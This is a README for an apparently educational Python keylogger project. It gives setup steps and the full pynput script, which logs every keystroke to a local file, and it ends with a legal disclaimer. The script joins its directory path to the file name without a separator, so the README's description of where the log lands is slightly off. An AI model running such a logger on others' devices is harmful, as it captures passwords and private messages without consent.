Keylogger

Overview

A keylogger is a tool designed to monitor and record keystrokes on a computer or mobile device. This project captures and stores keyboard inputs for analysis and monitoring purposes. It can be used for ethical and authorized applications, such as monitoring personal devices or educational purposes. Misuse of this tool is strictly prohibited and can have serious legal consequences.

Features

Keystroke Recording: Logs all keystrokes entered on the device.

Log File Storage: Stores recorded keystrokes in a log file named keylogger.txt.

Simple Implementation: Uses the pynput library for handling keyboard events.

Prerequisites

Programming Language: Python 3.x

Libraries: Ensure the following libraries are installed:

pynput (for keyboard event handling)

logging (for creating and managing log files)

To install the required Python libraries, use:

pip install pynput

Installation

Clone the repository or copy the keylogger script to your local machine.

Save the script in the desired directory. For example:

C:\Users\reeha\OneDrive\Desktop\Reeha\Cyber projects\Keylogger

Usage

Setup Log Directory:

Ensure the log_dir variable in the script points to the folder where the keylogger script is saved. For example:

log_dir = r"C:\Users\reeha\OneDrive\Desktop\Reeha\Cyber projects\Keylogger"

Run the Script:

Execute the script using Python:

python keylogger.py

Access Logs:

After running the script, the keystrokes will be logged in a file named keylogger.txt in the specified directory.

Stopping the Keylogger:

Stop the script manually by interrupting the Python process (e.g., using Ctrl + C in the terminal).

Script Code

Here is the provided keylogger script for reference:

import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:\Users\reeha\OneDrive\Desktop\Reeha\Cyber projects\Keylogger"
logging.basicConfig(filename=(log_dir + "keylogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

Legal Disclaimer

This keylogger is provided for educational and ethical purposes only. You are responsible for ensuring compliance with all applicable laws and regulations when using this tool. Unauthorized use of keyloggers is illegal and may result in severe penalties, including imprisonment.

License

This project is licensed under the MIT License. See the LICENSE file for more details.

Support

For issues or questions, please contact the project maintainer or open an issue in the repository.

